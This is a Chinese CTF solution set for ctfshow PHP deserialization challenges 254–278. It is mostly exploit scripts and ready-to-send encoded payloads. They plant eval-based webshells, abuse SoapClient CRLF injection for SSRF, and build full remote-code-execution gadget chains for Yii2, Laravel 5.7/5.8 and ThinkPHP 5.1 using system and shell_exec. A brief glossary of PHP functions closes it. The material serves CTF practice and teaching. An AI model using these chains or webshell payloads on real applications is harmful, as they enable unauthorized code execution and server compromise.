## 254、无要求

```python
# Payload
# get
/?username=xxxxxx&password=xxxxxx
```

## 255、正常反序列化

```php
# 解题思路
Get：?username=1&password=2
Cookie：序列化之后username1，password=2，$isVip=True的值
```

```php
# Exp
<?php
class ctfShowUser{
	public $username='1';
	public $password='2';
	public $isVip=True;
}
$a=new ctfShowUser();
echo urlencode(serialize($a));
?>
```

```python
# Payload
# get
/username=1&password=2
# cookie
user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

## 256、正常反序列化

```PYTHON
# EXP
<?php
class ctfShowUser{
  public $username='1';
  public $password='2';
  public $isVip=True;

}

$a = new ctfShowUser();
echo urlencode(serialize($a));
?>
```

```python
# Payload
# get
/username=1&password=2
# cookie
user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```



## 257、正常反序列化

```php
# Exp
<?php
class ctfShowUser{
	private $username='1';
	private $password='2';
	private $isVip=false;
	private $class;

		public function __construct(){
			$this->class=new backDoor();
		}
}
class backDoor{
	private $code="system('tac flag.php');";
}

$c = new ctfShowUser();
echo urlencode(serialize($c));
?>
```

```python
# Payload
# get
?username=xxxxxx&password=xxxxxx
# cookie
user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A1%3A%221%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A1%3A%222%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27tac+flag.php%27%29%3B%22%3B%7D%7D
```

## 258、+号绕过

```php
# Exp
<?php
class ctfShowUser{
	public $username='1';
	public $password='2';
	public $isVip=True;
	public $class;

		public function __construct(){
			$this->class=new backDoor();
		}
}
class backDoor{
	public $code='eval($_POST[1]);';
}

$c=serialize(new ctfShowUser());
$b=str_replace(':11',':+11',$c);
$b=str_replace(':8',':+8',$b);
echo urlencode($b);
?>
```

```python
# Payload
# get
?username=1&password=2 
# cookie
user=O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A%2B8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A%2B8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D
# post
1=system('tac fl*');
```



## 259、Soapclient + Crlf

```php
# EXP
<?php
$ua = "ctfshow\r\nX-Forworded-For: 127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client = new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));

echo urlencode(serialize($client));
?>
```

```php
# Payload
# 1、GET
?vip=O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A140%3A%22ctfshow%0D%0AX-Forworded-For%3A+127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
# 2、GET
/flag.txt
```



## 260、无难度

```PYTHON
# Payload
# GET
?ctfshow=ctfshow_i_love_36D
```



## 261、弱比较绕过

```php
# EXP
<?php
class ctfshowvip{
	public $username;
	public $password;
	public $code;

	public function __construct($u='',$p=''){
		$this->username = '877.php';
		$this->password = '<?php eval($_POST[a]);?>';
	}
}
echo urlencode(serialize(new ctfshowvip()));
```

```php
# Payload
# 1、GET
?vip=O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5Ba%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3BN%3B%7D
# 2、
GET	/877.php
POST	a=system('cat /fla*');
```



## 262、字符串逃逸

```php
# EXP
<?php

class message{
	public $from;
	public $msg;
	public $to;
	public $token='user';
	public function __construct($f,$m,$t){
		$this->from = $f;
		$this->msg = $m;
		$this->to = $t;
	}
}

function filter($msg){
	return str_replace('fuck','loveU',$msg);
}

$msg = new message('fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}','b','c');
$msg_1 = serialize($msg);
$msg_2 = filter($msg_1);
echo base64_encode($msg_2);
```

```php
# Payload
# GET
message.php
# Cookie
msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MzEwOiJsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVIjtzOjM6Im1zZyI7czoxOiJiIjtzOjI6InRvIjtzOjE6ImMiO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30iO3M6MzoibXNnIjtzOjE6ImIiO3M6MjoidG8iO3M6MToiYyI7czo1OiJ0b2tlbiI7czo0OiJ1c2VyIjt9
```



## 263、未通过

## 264、字符串逃逸

```PHP
# EXP
<?php

class message{
    public $from;
    public $msg;
    public $to;
    public $token='admin';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

function filter($msg){
	return str_replace('fuck','loveU',$msg);
}

$msg = new message('a','b','fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}');
$msg_1 = serialize($msg);
$msg_2 = filter($msg_1);
echo $msg_2;
```

```php
# Payload
# 1、GET
?f=a&m=b&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
# 2、GET
/message.php
# 2、Cookie
msg=123
```



## 265、变量引用

```php
# EXP
<?php
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = &$this->token;
    }
    public function login(){
        return $this->token===$this->password;
    }
}
$admin = new ctfshowAdmin('123','123');
echo serialize($admin);
```

```php
# Payload
?ctfshow=O:12:"ctfshowAdmin":2:{s:5:"token";s:3:"123";s:8:"password";R:2;}
```



## 266、异常绕过

```php
# EXP
<?php
class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
}

$admin = new ctfshow('123','123');
echo serialize($admin);
```

```php
# Payload
# post
O:7:"ctfshow":2:{}	# 把中间的值删除了
```



## 267、yii2.o反序列化复现

```php
# EXP
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'shell_exec';
            $this->id = "echo '<?php eval(\$_POST[1]);phpinfo(); ?>' > /var/www/html/basic/web/2.php";
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;
    class BatchQueryResult{
        private $_dataReader;
        public function __construct()
        {
            $this->_dataReader = new Generator();
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
```

```php
# Payload
# 1、
GET	/index.php?r=backdoor%2fshell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6NjQ6ImVjaG8gJzw%2fcGhwIGV2YWwoJF9QT1NUWzFdKTsgPz4nID4gL3Zhci93d3cvaHRtbC9iYXNpYy93ZWIvMi5waHAiO31pOjE7czozOiJydW4iO319fX0=
# 2、
GET	/2.php
POST	1=system('tac /flag');
```



## 268、yii2.0反序列化复现

```php
# EXP
<?php

namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'exec';
            $this->id = 'cp /f* 1.txt';
        }
    }
}
namespace Faker {

    use yii\rest\IndexAction;

    class Generator
    {
        protected $formatters;

        public function __construct()
        {
            $this->formatters['isRunning'] = [new IndexAction(), 'run'];
        }
    }
}
namespace Codeception\Extension{

    use Faker\Generator;

    class RunProcess
    {
        private $processes = [];
        public function __construct(){
            $this->processes[]=new Generator();
        }
    }
}
namespace{


    use Codeception\Extension\RunProcess;

    echo base64_encode(serialize(new RunProcess()));
}
```

```php
# Payload
# 1、
GET	/index.php?r=backdoor/shell&code=TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjk6ImlzUnVubmluZyI7YToyOntpOjA7TzoyMDoieWlpXHJlc3RcSW5kZXhBY3Rpb24iOjI6e3M6MTE6ImNoZWNrQWNjZXNzIjtzOjQ6ImV4ZWMiO3M6MjoiaWQiO3M6MTI6ImNwIC9mKiAxLnR4dCI7fWk6MTtzOjM6InJ1biI7fX19fX0=
# 2、
GET	/1.txt
```



## 269、yii反序列化复现

```php
# EXP
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', 'cp /f* 1.txt'); //命令执行
    echo(base64_encode(serialize($exp)));
}
```

```php
# Payload
# 1、
GET	/index.php?r=backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0=
# 2、
GET /1.txt
```



## 270、yii反序列化复现

```php
# EXP
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', 'cp /f* 1.txt'); //命令执行
    echo(base64_encode(serialize($exp)));
}
```

```php
# Payload
# 1、
GET	/index.php?r=backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0=
# 2、
GET	/1.txt
```



## 271、Laravel5.7反序列化复现

```PHP
# EXP
<?php

namespace Illuminate\Foundation\Testing {
    class PendingCommand
    {
        public $test;
        protected $app;
        protected $command;
        protected $parameters;

        public function __construct($test, $app, $command, $parameters)
        {
            $this->test = $test;                 //一个实例化的类 Illuminate\Auth\GenericUser
            $this->app = $app;                   //一个实例化的类 Illuminate\Foundation\Application
            $this->command = $command;           //要执行的php函数 system
            $this->parameters = $parameters;     //要执行的php函数的参数  array('id')
        }
    }
}

namespace Faker {
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}

namespace Illuminate\Foundation {
    class Application
    {
        protected $instances = [];

        public function __construct($instances = [])
        {
            $this->instances['Illuminate\Contracts\Console\Kernel'] = $instances;
        }
    }
}

namespace {
    $defaultgenerator = new Faker\DefaultGenerator(array("hello" => "world"));

    $app = new Illuminate\Foundation\Application();

    $application = new Illuminate\Foundation\Application($app);

    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, 'system', array('cat /flag')); //此处执行命令

    echo urlencode(serialize($pendingcommand));
}
```

```php
# Payload
# 1、
POST	data=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bs%3A5%3A%22hello%22%3Bs%3A5%3A%22world%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D
```



## 272、Laravel5.8反序列化复现

```php
# EXP
<?php
namespace PhpParser\Node\Scalar\MagicConst{
    class Line {}
}
namespace Mockery\Generator{
    class MockDefinition
    {
        protected $config;
        protected $code;

        public function __construct($config, $code)
        {
            $this->config = $config;
            $this->code = $code;
        }
    }
}
namespace Mockery\Loader{
    class EvalLoader{}
}
namespace Illuminate\Bus{
    class Dispatcher
    {
        protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    }
}
namespace Illuminate\Foundation\Console{
    class QueuedCommand
    {
        public $connection;
        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}
namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}
namespace{
    $line = new PhpParser\Node\Scalar\MagicConst\Line();
    $mockdefinition = new Mockery\Generator\MockDefinition($line,"<?php file_put_contents('/app/public/1.php','<?php eval(\$_POST[1]); ?>') ?>");
    $evalloader = new Mockery\Loader\EvalLoader();
    $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,'load'));
    $queuedcommand = new Illuminate\Foundation\Console\QueuedCommand($mockdefinition);
    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);
    echo urlencode(serialize($pendingbroadcast));
}
?>
```

```PHP
# Payload
# 1、
POST	data=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A37%3A%22PhpParser%5CNode%5CScalar%5CMagicConst%5CLine%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A75%3A%22%3C%3Fphp+file_put_contents%28%27%2Fapp%2Fpublic%2F1.php%27%2C%27%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B+%3F%3E%27%29+%3F%3E%22%3B%7D%7D%7D
# 2、
GET	/1.php
POST	1=system('cat /flag');
```



## 273、Laravel5.8反序列化复现

```php
# EXP
<?php
namespace PhpParser\Node\Scalar\MagicConst{
    class Line {}
}
namespace Mockery\Generator{
    class MockDefinition
    {
        protected $config;
        protected $code;

        public function __construct($config, $code)
        {
            $this->config = $config;
            $this->code = $code;
        }
    }
}
namespace Mockery\Loader{
    class EvalLoader{}
}
namespace Illuminate\Bus{
    class Dispatcher
    {
        protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    }
}
namespace Illuminate\Foundation\Console{
    class QueuedCommand
    {
        public $connection;
        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}
namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}
namespace{
    $line = new PhpParser\Node\Scalar\MagicConst\Line();
    $mockdefinition = new Mockery\Generator\MockDefinition($line,"<?php file_put_contents('/app/public/1.php','<?php eval(\$_POST[1]); ?>') ?>");
    $evalloader = new Mockery\Loader\EvalLoader();
    $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,'load'));
    $queuedcommand = new Illuminate\Foundation\Console\QueuedCommand($mockdefinition);
    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);
    echo urlencode(serialize($pendingbroadcast));
}
?>
```

```php
# Payload
# 1、
POST	data=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A37%3A%22PhpParser%5CNode%5CScalar%5CMagicConst%5CLine%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A75%3A%22%3C%3Fphp+file_put_contents%28%27%2Fapp%2Fpublic%2F1.php%27%2C%27%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B+%3F%3E%27%29+%3F%3E%22%3B%7D%7D%7D
# 2、
GET	/1.php
POST	1=system('cat /flag');
```



## 274、Thinkphp5.1反序列化复现

```php
# EXP
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["lin"=>["ctf","show"]];
        $this->data = ["lin"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',  
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>'lin'];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}


namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```

```php
# Payload
GET	?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6MzoiY3RmIjtpOjE7czo0OiJzaG93Ijt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6MzoibGluIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjk7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czozOiJsaW4iO319fX19fQ==&lin=cat /fl*
```



## 275、无难度

```php
# Payload
GET	?fn=php;cat fl*
```



## 276、未通过

## 277、未通过

## 278、未通过



## N、知识点

### 1、error_reporting()

```python
# 解释
规定报告哪个错误，可设置当前脚本的错误报告级别。
```

```python
# 参数
error_reporting(0);			# 禁用，不显示错误
error_reporting(E_ERROR | E_WARNING | E_PARSE);	# 报告运行时错误
error_reporting(E_ALL);		# 报告所有错误
```

### 2、include()

```python
# 解释
获取指定文件中存在的所有文本/代码/标记，并复制到引用include的文件中。
```

```python
# 用法
include(flag.php)	# 包含flag.php，常用于靶场
```

### 3、highlight_file()

```python
# 解释
对文件进行语法高亮显示
```

```python
# 用法
highlight_file(__FILE__)	# 当前文件中将被包含的文件进行语法高亮显示
```

### 4、explode()

```python
# 解释
把字符串打散成数组
```

```python
# 用法
explode(' ',$str)			# 以空格为分隔符，分割$str中的字符串为数组
```

### 5、HTTP X_FORWARDED_FOR

```PYTHON
# 解释
XFF，识别客户端IP
```

### 6、array_pop()

```python
# 解释
删除数组中的最后一个元素
```

```python
# 用法
array_pop($array)
```

### 7、die()

```python
# 解释
输出一条消息，并退出当前脚本。该函数是exit()函数的别名
```

```python
# 用法
die(status)		# 退出前输出一个字符串
```

### 8、file_put_contents()

```python
# 解释
将字符串写入文件
```

```python
# 用法
file_put_contents('x.txt',$str)
```

### 9、SoapClient()

```python
# 解释
SoapClient采用HTTP协议，XML作为数据传输格式。新建一个SoapClient类对象时，需要两个参数，一个是字符串类型的wsdl，另一个是数组形式的options。
```

```python
# 用法
$client = new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/test'));
```

### 10、Content-Type

```python
# 解释
Internet Media Type，互联网媒体类型，也称作MIME类型
```

```python
# 参数
type：主类型，任意字符串，如text，*代表所有
subtupe：子类型，任意字符串，如html，*代表所有，用"/"与主类型隔开
parameter：可选参数，如charset，boundary等。
```

```python
# 用法
Centent-Type: text/html;
Content-Type: application/json;charset:utf-8;
```

```python
# 常见Content-Type
text/html;					# HTML文档标记
image/jpeg;					# JPEG图片标记
image/gif;					# GIF图片标记
application/javascript;		 # JS文档标记
application/xml;			# XML文档标记
application/x-www-form-urlencoded	# 表单提交，特殊字符被url编码
multipart/form-data			# 生成boundary分割不同字段，常用于上传文件的表单
application/json			# Json格式
application/xml 或者 text/xml	# Xml格式
```

### 11、__wakeup()

```php
# 解释
在类外部使用unserialize()函数时，会先调用__wakeup()函数
```

### 12、__sleep()

```php
# 解释
在类外部使用serialize()函数时，会先调用__sleep()函数
```

### 13、__invoke()

```php
# 解释
当尝试以调用函数方式调用一个对象时，__invoke()方法会被自动调用
```

### 14、seesion_start()

```python
# 解释
创建新会话或者重用现有会话。如果通过GET或POST方法，或者使用COOKIE提交了会话ID，则会重用现有会话
```

### 15、shell_exec()

```php
# 解释
通过shell执行命令并以字符串形式返回完整输出，等价于反引号``
```

### 16、pwd|base64

```php
# 解释
对管道符前的命令（pwd）输出结果进行base64编码
```

### 17、phar()

```php
# 解释
Phar(PHP_Archive)，PHP的打包工具，可以将多个php文件打包成一个文件。
```

